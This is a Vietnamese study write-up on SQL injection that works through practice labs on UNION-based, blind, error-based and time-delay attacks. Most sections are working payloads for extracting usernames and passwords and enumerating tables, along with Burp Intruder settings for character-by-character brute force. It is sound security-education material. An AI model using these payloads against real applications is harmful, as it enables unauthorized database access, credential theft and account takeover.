# Tìm hiểu về SQL injection
- Người thực hiện: Lê Thị Mỹ Tiên
- Cập nhật lần cuối: 21/8/2025
## Mục Lục
## Nội dung
### 1. Khái niệm - Tác động
- SQL Injection (SQLi) là một lỗ hổng bảo mật web cho phép kẻ tấn công chèn hoặc can thiệp vào các truy vấn SQL mà ứng dụng gửi đến cơ sở dữ liệu.

- Tác động: 
  + Rò rỉ dữ liệu nhạy cảm (dữ liệu người dùng khác, thông tin hệ thống, v.v.).
  + Sửa đổi hoặc xóa dữ liệu, gây thay đổi nội dung và hành vi ứng dụng.
  + Trong trường hợp nghiêm trọng, có thể chiếm quyền kiểm soát máy chủ hoặc hạ tầng backend.
  + Có thể dẫn đến tấn công từ chối dịch vụ (DoS).

---

### 2. Cách phát hiện lỗ hổng SQL injection
Có thể phát hiện SQLi theo cách thủ công bằng cách:
- Ký tự dấu nháy đơn 'và tìm kiếm lỗi hoặc các bất thường khác.

- Một số cú pháp SQL cụ thể đánh giá theo giá trị cơ sở (gốc) của điểm vào và theo một giá trị khác, đồng thời tìm kiếm sự khác biệt có hệ thống trong phản hồi của ứng dụng.

- Các điều kiện Boolean như OR 1=1 và OR 1=2, và tìm kiếm sự khác biệt trong phản hồi của ứng dụng.

- Tải trọng được thiết kế để kích hoạt độ trễ thời gian khi thực hiện trong truy vấn SQL và tìm kiếm sự khác biệt về thời gian phản hồi.

- Tải trọng OAST được thiết kế để kích hoạt tương tác mạng ngoài băng tần khi được thực hiện trong truy vấn SQL và giám sát mọi tương tác phát sinh.
  
---

#### 2.1 Phát hiện SQLi trong các phần khác nhau của truy vấn
- Hầu hết các lỗ hổng SQL injection đều xảy ra trong `WHERE` của một `SELECT`.
- Trong `UPDATE`, ở các giá trị được cập nhật hoặc `WHERE`.
- Trong `INSERT`, bên trong các giá trị được chèn vào.
- Trong `SELECT`, bên trong tên bảng hoặc cột.
- Trong `SELECT`, mệnh đề `ORDER BY`.

---

##### 2.1.1 Truy vấn dữ liệu ẩn
📜**LAB 1: SQLI TRONG MỆNH ĐỀ WHERE CHO PHÉP TRUY XUẤT DỮ LIỆU ẨN**

Bài thực hành này chứa lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện một truy vấn SQL như sau:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Thực hiện một cuộc tấn công tiêm SQL khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa phát hành.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/23e7245a-aec2-4c44-9eb0-99480937f093" />


---


##### 2.1.2 Phá vỡ logic ứng dụng
Nếu ứng dụng kiểm tra thông tin đăng nhập bằng câu truy vấn sau:<br>
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
Nếu truy vấn trả về thông tin chi tiết của người dùng, thì đăng nhập thành công. Nếu không, đăng nhập sẽ bị từ chối.

Trong trường hợp này, kẻ tấn công có thể đăng nhập bằng bất kỳ người dùng nào mà không cần mật khẩu. Chúng có thể thực hiện việc này bằng cách sử dụng chuỗi chú thích SQL -- để xóa kiểm tra mật khẩu khỏi mệnh đề truy vấn WHERE. 
Ví dụ:<br> `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
📜 **LAB 2: SQLI CHO PHÉP BỎ QUA ĐĂNG NHẬP**
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6976fdfb-7c4f-4c36-a8b0-b19acab55f3f" />

---

##### 2.1.3 Lấy dữ liệu từ cơ sở dữ liệu khác - Tấn công SQLi UNION
Ta có thể sử dụng UNION để thực thi truy vấn SELECT bổ sung và thêm kết quả vào truy vấn ban đầu. Ví dụ:

Nếu một ứng dụng thực hiện truy vấn sau có chứa thông tin đầu vào của người dùng `Gifts`: <br>
`SELECT name, description FROM products WHERE category = 'Gifts'` <br>
 Kẻ tấn công có thể gửi thông tin đầu vào:
 `' UNION SELECT username, password FROM users--`
 
Điều này khiến ứng dụng trả về tất cả tên người dùng và mật khẩu cùng với tên và mô tả sản phẩm.

Để UNION có hiệu quả, hai yêu cầu chính phải được đáp ứng:
- Các truy vấn riêng lẻ phải trả về cùng số cột.
- Các kiểu dữ liệu trong mỗi cột phải tương thích giữa các truy vấn riêng lẻ.

###### 2.1.3.1 Xác định số lượng cột
Khi thực hiện SQL Injection dạng UNION, cần biết số lượng cột trong truy vấn gốc. Có hai phương pháp xác định:

- ORDER BY:
  + Thêm ORDER BY 1--, ORDER BY 2--, ORDER BY 3--... vào payload.
  + Khi vượt quá số cột thực tế, cơ sở dữ liệu báo lỗi (ví dụ: out of range).
  + Dựa vào lỗi hoặc sự khác biệt trong phản hồi, có thể suy ra số lượng cột.
- UNION SELECT với NULL:
  + ThửUNION SELECT NULL--, UNION SELECT NULL,NULL--, UNION SELECT NULL,NULL,NULL--...
  + Nếu số lượng NULL không khớp với số cột → báo lỗi.
  + Khi khớp → truy vấn hợp lệ, có thể trả về một dòng chứa toàn NULL.
  + Dấu hiệu trong phản hồi HTTP có thể là: thêm dữ liệu, báo lỗi khác, hoặc không khác biệt gì.

📜**LAB 3: SQLI UNION, XÁC ĐỊNH SỐ LƯỢNG CỘT ĐƯỢC TRẢ VỀ BỞI TRUY VẤN**

Lab này xác định số cột được truy vấn trả về bằng cách thực hiện tấn công SQL injection UNION trả về một hàng bổ sung chứa các giá trị null

Bước 1: Sửa đổi tham số `category` bằng cách gán giá trị  `'+UNION+SELECT+NULL--` Quan sát thấy lỗi xảy ra.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5e8f0d90-96f8-41ed-89a4-5fedd38e908c" />
Bước 2: Sửa đổi tham số category để thêm một cột bổ sung có chứa giá trị null
`'+UNION+SELECT+NULL,NULL--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/70c8e582-76af-40fa-825e-8dc4006461eb" />
Bước 3: Tiếp tục thêm giá trị null cho đến khi lỗi biến mất và phản hồi bao gồm nội dung bổ sung có chứa giá trị null.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4181a66f-dec6-43c7-887b-9b8fd09b9da3" />

###### 2.1.3.2 Tìm các cột có dữ liệu quan trọng:
- **Mục đích**: SQL injection với UNION cho phép chèn truy vấn để lấy thêm dữ liệu.
- **Điều kiện**: Cần tìm cột trong kết quả truy vấn gốc có kiểu dữ liệu chuỗi hoặc tương thích với chuỗi.
- Các bước chính:
  + Xác định số lượng cột của truy vấn gốc.
  + Thử từng cột bằng cách chèn giá trị chuỗi 'a' trong từng vị trí và để các cột còn lại NULL. Ví dụ: `' UNION SELECT 'a',NULL,NULL,NULL--`
  + Quan sát phản hồi:
    + Nếu có lỗi kiểu dữ liệu (ví dụ lỗi chuyển đổi kiểu), cột không phù hợp.
    + Nếu phản hồi chứa chuỗi vừa chèn, cột đó có thể dùng để trích xuất dữ liệu.

📜**LAB 4: SQLI UNION, TÌM MỘT CỘT CHỨA VĂN BẢN**
Bước 1: Xác định số lượng cột: 

`'+UNION+SELECT+NULL,NULL,NULL--`. Truy vấn thành công xác định được có 3 cột 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/636cc615-85c3-4cb5-a734-45bfd030c80b" />
Bước 2: Thay thế mỗi giá trị null bằng giá trị ngẫu nhiên. Nếu xảy ra lỗi, chuyển sang giá trị null tiếp theo
`'+UNION+SELECT+'dJAwsm',NULL,NULL--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ae794735-470a-468e-bdfd-e7f59b21a53a" />
Khi thử: `'+UNION+SELECT+NULL,'dJAwsm',NULL--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4701e3f0-5750-4644-9a21-4134aa7b769b" />

###### 2.1.3.3 Lấy dữ liệu quan trọng
Khi đã xác định được số cột được trả về bởi truy vấn ban đầu và tìm ra những cột nào có thể chứa dữ liệu chuỗi,ta có thể truy xuất các dữ liệu quan trọng

📜**LAB 5: SQLI UNION, LẤY DỮ LIỆU TỪ CÁC BẢNG KHÁC**

Cơ sở dữ liệu có một bảng mang tên users, bao gồm các cột username và password.

Để hoàn thành bài thực hành, bạn cần khai thác lỗ hổng bằng kỹ thuật SQL injection với câu lệnh UNION để thu thập toàn bộ tên người dùng và mật khẩu, sau đó dùng dữ liệu này để đăng nhập với quyền administrator.

Bước 1: Xác định số cột →  Có 2 cột `'+UNION+SELECT+ NULL, NULL --` 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ba6d5a4d-98d4-4c33-aa8c-cfdacbf2fc21" />
Bước 2: Xác định những cột nào có chứa dữ liệu chuỗi →  cả 2 cột đều chứa dữ liệu chuỗi
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4b1a33b3-8ec2-4d07-922f-a481f6d912e4" />
Bước 3: Lấy nội dung của bảng `users` bằng:

`'+UNION+SELECT+username,+password+FROM+users--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3abd604a-a45f-4c4e-ac36-fa76e1dde5d0" />
Bước 4: Đăng nhập với người dùng `administrator` với mật khẩu `u0gz50s24yw0i0zvod9l`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/046dc171-8be0-4b13-821e-345e0594016a" />

###### 2.1.3.4 Lấy nhiều giá trị trong một cột duy nhất

Có thể truy xuất nhiều giá trị cùng lúc trong một cột duy nhất này bằng cách nối các giá trị lại với nhau bằng cách thêm dấu phân cách để phân biệt các giá trị được kết hợp. Ví dụ: trên Oracle, bạn có thể gửi dữ liệu đầu vào:

`' UNION SELECT username || '~' || password FROM users--`

Câu lệnh này sử dụng chuỗi double-pipe ||, một toán tử nối chuỗi trong Oracle. Truy vấn được chèn sẽ nối các giá trị của trường usernamevà password, được phân tách bằng ~.

📜**LAB 6: SQLI UNION, TRUY XUẤT NHIỀU GIÁ TRỊ TRONG MỘT CỘT**

Bước 1: Xác định số cột và những cột có chứa dữ liệu văn bản
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4a7f7a1e-f92c-42d7-a4f0-108b19e2db4b" />
Bảng có 2 cột và cột thứ 2 có chứa dữ liệu chuỗi
Bước 2: Lấy nội dung bảng `users` bằng:

`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/da3be821-6d72-4c43-94c9-53cdd3f6da35" />
Bước 3: Đăng nhập với các tài khoản đó

---

##### 2.1.4 Kiểm tra cơ sở dữ liệu
###### 2.1.4.1 Truy vấn loại và phiên bản cơ sở dữ liệu
- Microsoft, MySQL	`SELECT @@version`
- Oracle	`SELECT * FROM v$version`
- PostgreSQL	`SELECT version()`

📜**LAB 7: SQLI - TRUY VẤN LOẠI VÀ PHIÊN BẢN CSDL TRÊN ORACLE**

Bước 1: Xác định số cột và những cột nào chứa dữ liệu chuỗi trong bảng `dual`

Bước 2: Sử dụng để xác định phiên bản csdl:
`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/647b0a88-a216-4105-9198-337b2415779c" />

📜**LAB 8: SQLI - TRUY VẤN LOẠI VÀ PHIÊN BẢN CSDL TRÊN MySQL và Microsoft**
Sử dụng đoạn mã sau để hiển thị phiên bản csdl:
`'+UNION+SELECT+@@version,+NULL#`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/05dcbe6e-486d-4636-a5f8-c003a69ff3b0" />

###### 2.1.4.2 Liệt kê nội dung
📜**LAB 9: SQLI -  LIỆT KÊ NỘI DUNG CƠ SỞ DỮ LIỆU TRÊN CƠ SỞ DỮ LIỆU KHÔNG PHẢI ORACLE**

Lab này giúp xác định tên của bảng lưu trữ tên và mật khẩu người dùng và các cột chứa trong bảng, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng. Sau đó đăng nhập với tư cách administrator.

Bước 1: Xác định bảng có 2 cột và cả 2 cột có chứa dữ liệu chuỗi: `'+UNION+SELECT+'abc','def'--`

Bước 2: Lấy danh sách các bảng trong cơ sở dữ liệu:
`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d7466efe-0eac-4148-81d4-8d9aca5c7474" />
**Bảng cần tìm là `users_skzuou`**

Bước 3: Lấy thông tin người dùng trong bảng users_skzuou:

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_skzuou'--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/22bddf7d-6a49-4910-ba9b-74dae5d51293" />

**Bảng `users_skzuou` có 3 thông tin `username_apyucq`, `email`, `password_kwrrxk`**

Bước 4: Sử dụng để tìm tên và mật khẩu người dùng:

`'+UNION+SELECT+username_apyucq,+password_kwrrxk+FROM+users_skzuou--`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/902bf7f8-4445-4425-b787-2cb89d0b6f41" />
Bước 5: Đăng nhập với người dùng: administrator - 59n3hpytgcyoahyjzoww

📜**LAB 10: SQLI -  LIỆT KÊ NỘI DUNG CƠ SỞ DỮ LIỆU TRÊN CƠ SỞ DỮ LIỆU TRÊN ORACLE**

Bước 1: Xác định bảng có 2 cột và cả 2 cột có chứa dữ liệu chuỗi: `'+UNION+SELECT+'abc','def'+FROM+dual--`

Bước 2: Lấy danh sách các bảng trong cơ sở dữ liệu:
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/159baf09-9c7b-4d06-b984-57100f2eba71" />

**Bảng cần tìm là `USERS_ZXNGKF`**

Bước 3: Lấy thông tin người dùng trong bảng USERS_ZXNGKF:

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='USERS_ZXNGKF'--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a69327b4-f420-4479-a4f7-e3aef157df28" />



**Bảng `USERS_ZXNGKF` có 3 thông tin `EMAIL`, `PASSWORD_UXHAGP`, `USERNAME_IMTUVJ`**

Bước 4: Sử dụng để tìm tên và mật khẩu người dùng:

`'+UNION+SELECT+USERNAME_IMTUVJ,+PASSWORD_UXHAGP+FROM+USERS_ZXNGKF--`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dfeecf63-28ef-4130-9983-1295d34e642e" />

Bước 5: Đăng nhập với người dùng: administrator - ghczq9nns2x2kdffkm32

---

##### 2.1.5 Lỗ hổng SQLi mù:
Tiêm SQL mù là dạng SQL injection mà ứng dụng bị lỗ hổng nhưng không hiển thị kết quả truy vấn hoặc thông tin lỗi. Do đó, các kỹ thuật như UNION không hiệu quả. Để khai thác, kẻ tấn công phải dùng phương pháp khác (ví dụ: dựa vào phản hồi đúng/sai hoặc thời gian phản hồi) để lấy dữ liệu trái phép.

###### 2.1.5.1 Khai thác lỗi SQLi bằng cách kích hoạt phản hồi có điều kiện
- Ứng dụng sử dụng giá trị TrackingId trong cookie để truy vấn cơ sở dữ liệu.
- Truy vấn dễ bị SQL injection, nhưng không trả về dữ liệu trực tiếp. Ứng dụng chỉ hiển thị thông báo khác nhau (“Chào mừng trở lại”) tùy kết quả truy vấn.
- Kẻ tấn công có thể khai thác sự khác biệt này bằng cách chèn các điều kiện logic (đúng/sai) để suy ra dữ liệu.
- Bằng cách kiểm tra từng ký tự (so sánh lớn hơn, nhỏ hơn, bằng), có thể trích xuất thông tin nhạy cảm như mật khẩu của người dùng.

📜**LAB 11: SQLI MÙ VỚI PHẢN HỒI CÓ ĐIỀU KIỆN**

Phòng thí nghiệm có lỗ hổng SQL injection mù qua cookie. Ứng dụng dùng giá trị cookie để truy vấn, không trả về kết quả hay lỗi, nhưng hiển thị thông báo "Welcome back" nếu có dữ liệu. Cơ sở dữ liệu có bảng users với cột username và password. Mục tiêu là khai thác lỗ hổng để lấy mật khẩu của tài khoản administrator và đăng nhập thành công.

Bước 1: Thay đổi `TrackingId = 7ME7rwXxPnGRU69q` thành `TrackingId=7ME7rwXxPnGRU69q' AND '1'='1` -> Tin nhắn `Welcome back` xuất hiện
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a5836108-9859-4b59-ad21-34bd02d708ea" />
Bước 2 đổi thành `TrackingId=7ME7rwXxPnGRU69q' AND '1'='2 ` -> Tin nhắn `Welcome back` không xuất hiện
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f376d7b9-46c3-4aa7-9dd2-db0ff014b8e8" />
Bước 3: Đổi thành `TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users LIMIT 1)='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f1cf2772-8ceb-40d3-a5b2-9693fbafaf10" />
Có tin nhắn Welcome back xác minh rằng điều kiện là đúng, xác nhận rằng có một bảng có tên là `users`.

Bước 4: Đổi thành `TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5a3eb08f-b92f-4998-b6bb-493853bccd6d" />
Có tin nhắn Welcome back xác minh rằng điều kiện là đúng, xác nhận rằng có một người dùng được gọi là `administrator`

Bước 5: Bước tiếp theo là xác định số ký tự trong mật khẩu của administrator. Đổi thành 

`TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/341b6858-cf59-4c53-b67c-2d05340b0cd7" />
Điều kiện này phải đúng, xác nhận rằng mật khẩu dài hơn 1 ký tự.

Bước 6: 
Gửi một loạt giá trị theo dõi để kiểm tra độ dài mật khẩu khác nhau

`TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/66ecec92-a861-4305-ad3a-d64a58374891" />
Tiếp tục thay đổi giá trị để xác định độ dài của mật khẩu:

`TrackingId=7ME7rwXxPnGRU69q' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2affdd0a-b9be-42ef-ab1a-554e02c1f54b" />
**Xác định được độ dài của mật khẩu, thực tế là 20 ký tự**

**Xác định giá trị kí tự tại mỗi vị trí**

Bước 7: Trong Intruder: 
`TrackingId=0Ng3V1e3t5uRTDir' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
`SUBSTRING()` để trích xuất một ký tự duy nhất từ ​​mật khẩu và kiểm tra nó với một giá trị cụ thể. Ta sẽ kiểm tra từng vị trí và giá trị có khả năng, lần lượt kiểm tra từng giá trị

Bước 8: Thêm § xung quanh `a` và 1 trong giá trị cookie- lấy ký tự thứ `$1$` trong mật khẩu của administrator và so sánh với `$a$`. Chọn cluster bomb attack.Trong Payloads.Chọn lần lượt `1-1`, `Numbers`, `From: 1`, `To: 20`, `Step: 1`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7c019ab2-c8e9-45f4-a746-9de3a3b7d745" />
- Payload 1: số thứ tự cột cần lấy ký tự (1 → 20).
- Payload 2: brute force từng ký tự (a–z, 0–9).

Bước 9: Trong Payloads, đổi thành `2-a`, `Brute-Force`, `Min length: 1`, `Max-lenght:1`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2ed38c5d-3ce1-4c1a-923b-e17af5a27a80" />
- Payload 1: số thứ tự từ 1 đến 20 (vị trí ký tự trong chuỗi).
- Payload 2: brute force ký tự với tập ký tự `abcdefghijklmnopqrstuvwxyz0123456789`

Bước 10:  hãy nhấp vào Tab Cài đặt để mở bảng điều khiển bên Cài đặt . Trong phần Grep - Match , hãy xóa các mục hiện có trong danh sách, sau đó thêm giá trị Welcome back. Click bắt đầu tấn công.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a404339a-8707-4290-a954-c3e64482ac82" />
Các giá trị có payload 1 thứ tự 1 đến 20 có tick `Welcome back` là mật khẩu của administrator: `ty759g6ajl40wnvytqg6`

###### 2.1.5.2 SQLi dựa trên lỗi
- Kịch bản phổ biến
  + Kích hoạt lỗi dựa trên biểu thức boolean: Dựa vào việc ứng dụng trả về hoặc không trả về lỗi, kẻ tấn công có thể suy ra giá trị đúng/sai và khai thác tương tự như SQL injection mù
  + Kích hoạt lỗi để lộ dữ liệu: Một số thông báo lỗi có thể chứa dữ liệu truy vấn, giúp kẻ tấn công trực tiếp nhìn thấy dữ liệu nhạy cảm.

**Khai thác lỗi SQL injection bằng cách kích hoạt lỗi có điều kiện**

- Có thể khai thác bằng cách gây ra lỗi có điều kiện: sửa đổi truy vấn để tạo lỗi cơ sở dữ liệu (ví dụ chia cho 0) chỉ khi một điều kiện đúng.
- Nếu ứng dụng phản hồi khác khi có lỗi (ví dụ trả về thông báo lỗi hoặc mã trạng thái khác), kẻ tấn công có thể suy ra tính đúng/sai của điều kiện.
- Kỹ thuật này cho phép trích xuất dữ liệu từng ký tự, kiểm tra dần thông tin nhạy cảm (ví dụ tên tài khoản, mật khẩu).

📜**LAB 12: SQLI MÙ VỚI LỖI CÓ ĐIỀU KIỆN**

Bước 1: Đổi thành `TrackingId=0KiBtOMaYkZKtHgZ''` để cho thấy lỗi cú pháp (trong trường hợp này là dấu ngoặc kép không đóng) đang có tác động đáng kể đến phản hồi.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bae6db23-8102-44bd-b0db-96243d68f0a0" />

Bước 2: Xác định đây là lỗi cú pháp SQL chứ không phải bất kỳ loại lỗi nào khác
`TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT '' FROM dual)||'` -> điều này cho thấy mục tiêu có thể đang sử dụng cơ sở dữ liệu Oracle, yêu cầu tất cả SELECTcác câu lệnh phải chỉ định rõ ràng tên bảng.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c9b46fda-f26a-4c7b-b17f-4b1be415b660" />
Bước 3: Xác minh trong csdl có bảng `Users`

`TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2c26ebbf-d680-4cb7-8745-ea8c40643f87" />
Bước 4: Xác minh người dùng administrator có tồn tại hay không:

`TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` -> Có lỗi vậy có người dùng administrator
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d768a7ae-575d-438a-81cd-0784fddbe497" />

Bước 5: Xác định số ký tự trong mật khẩu 

`TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7202901a-045c-4bc3-8a2a-eda5e41ff38f" />

Tăng dần để xác định được số ký tự trong mật khẩu là **20 ký tự**
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/554568b7-2217-4a72-b4db-a091550c7a27" />

**Xác định giá trị kí tự tại mỗi vị trí**

 `TrackingId=0KiBtOMaYkZKtHgZ'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/77e9399e-12d8-49e9-8b73-de6684e572df" />
Ứng dụng trả về mã trạng thái HTTP 500 khi lỗi xảy ra, và mã trạng thái HTTP 200 thông thường. Cột "Trạng thái" trong kết quả Intruder hiển thị mã trạng thái HTTP, vì vậy ta có thể dễ dàng tìm thấy hàng có giá trị 500 trong cột này

**Mật khẩu là: 5eashkev2js3u58v2e00**

**Trích xuất dữ liệu nhạy cảm thông qua các thông báo lỗi SQL chi tiết**
- Khi nhập dữ liệu không hợp lệ (ví dụ thêm dấu nháy đơn vào tham số), ứng dụng có thể trả về thông báo lỗi chi tiết, hiển thị cả câu lệnh SQL. Điều này giúp kẻ tấn công hiểu rõ cấu trúc truy vấn và dễ dàng khai thác SQL Injection.
- Thông báo lỗi cũng có thể để lộ dữ liệu từ cơ sở dữ liệu nếu kẻ tấn công cố tình gây lỗi (ví dụ dùng hàm CAST() để chuyển đổi kiểu dữ liệu không hợp lệ).
- Khi chuyển một chuỗi sang kiểu số nguyên, cơ sở dữ liệu có thể trả về lỗi chứa chính dữ liệu đó, giúp kẻ tấn công nhìn thấy thông tin nhạy cảm.

📜**LAB 13: SQLI DỰA TRÊN LỖI HIỂN THỊ**

Bước 1: Thêm `'` vào `TrackingId =kKSkdvB8shlgfc4b`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7936769e-7760-4929-a13b-4b075c7676d6" />
Ở vị trí 52 trong câu lệnh SQL, chuỗi ký tự được mở bằng dấu nháy nhưng không đóng đúng cách (''). Nó tiết lộ tên bảng, cột và cách dữ liệu được đặt trong dấu nháy, giúp kẻ tấn công biết cách chèn payload khi khai thác SQL injection dựa trên lỗi hiển thị.

Bước 2: Điều chỉnh truy vấn để bao gồm một truy vấn SELECT phụ chung và chuyển đổi giá trị trả về thành một int 

`TrackingId=kKSkdvB8shlgfc4b' AND CAST((SELECT 1) AS int)--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/35cf4985-2548-4bee-8498-bbf12fec0a88" />
Ta nhận được một lỗi khác rằng điều kiện AND là một biểu thức boolean
-> **Truy vấn hợp lệ:** `TrackingId=kKSkdvB8shlgfc4b' AND 1=CAST((SELECT 1) AS int)--`

Bước 3: Lấy tên người dùng từ cơ sở dữ liệu:

`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d6ab67ca-2da7-4b64-bab2-377649dd3f0e" />
Nghĩa là cơ sở dữ liệu đang cố gắng chuyển giá trị "administrator" sang kiểu số nguyên (integer) nhưng thất bại vì đây là chuỗi chữ -> Biết rằng đây administrator là người dùng đầu tiên trong bảng

Bước 4: Lấy mật khẩu: **jfyes1q73gnxz7esjxg1**

`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c352b3d9-9282-4090-8908-7bcefdd61633" />

###### 2.1.5.3 Kích hoạt thời gian trễ
- SQL Injection mù có thể khai thác bằng cách dùng độ trễ thời gian để suy ra điều kiện đúng/sai.
- Vì ứng dụng xử lý truy vấn đồng bộ, khi truy vấn bị trì hoãn thì phản hồi HTTP cũng chậm theo, giúp xác định kết quả.
- Có thể dùng phương pháp này để trích xuất dữ liệu từng ký tự, như kiểm tra mật khẩu quản trị viên bằng câu lệnh so sánh ký tự.

📜**LAB 14: SQLI MÙ VỚI ĐỘ TRỄ THỜI GIAN**
 Thay đổi `TrackingId` thành `TrackingId=cHy1E3pZqYfJSLEL'||pg_sleep(10)--`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a8f76539-f0d0-44b0-a65b-54f4aad7a490" />
📜**LAB 15: SQLI MÙ VỚI ĐỘ TRỄ THỜI GIAN VÀ TRUY XUẤT THÔNG TIN**

Bước 1: Thay TrackingId = `TrackingId=Ok6KWnCgfj2XJTjU'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`. Xác định ứng dụng phản hồi ngay lập tức mà ko có độ trễ 

Bước 2: Đổi thành `TrackingId=Ok6KWnCgfj2XJTjU'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` để xác nhận có người dùng administrator
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ef583cac-7254-4d93-b431-c6c527714ad4" />
Bước 3: Xác định số ký tự trong mật khẩu:
`TrackingId=Ok6KWnCgfj2XJTjU'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 
 **Xác định có 20 ký tự trong mật khẩu**

`TrackingId=Ok6KWnCgfj2XJTjU'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Bước 4: Làm tương tự các Lab kia. Trong Resource pool,thêm cuộc tấn công vào nhóm tài nguyên với Maximum concurrent requests được đặt thành 1 - để biết khi nào ký tự chính xác được gửi đi, ta cần theo dõi thời gian ứng dụng phản hồi từng yêu cầu. Để quá trình này đúng ta cần cấu hình cuộc tấn công Intruder để gửi yêu cầu trong một luồng duy nhất.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/808feeaf-104f-4aad-8934-9001bd21daa9" />
Trong tab Response received thường chứa một số nhỏ, biểu thị số mili giây mà ứng dụng đã mất để phản hồi. Một trong các hàng sẽ có số lớn hơn trong cột này, khoảng 10.000 mili giây. Giá trị payload hiển thị cho hàng đó là giá trị của ký tự trong mật khẩu
**Mật khẩu: 3gu8bjaowitku1thu2zg**

###### 2.1.5.4 Kỹ thuật ngoài băng tần (OAST)
Trong trường hợp này, kẻ tấn công thường khai thác bằng cách tạo ra tương tác mạng ngoài băng thông (out-of-band) đến hệ thống do họ kiểm soát. Phổ biến nhất là DNS, vì thường được phép tự do trong môi trường sản xuất.

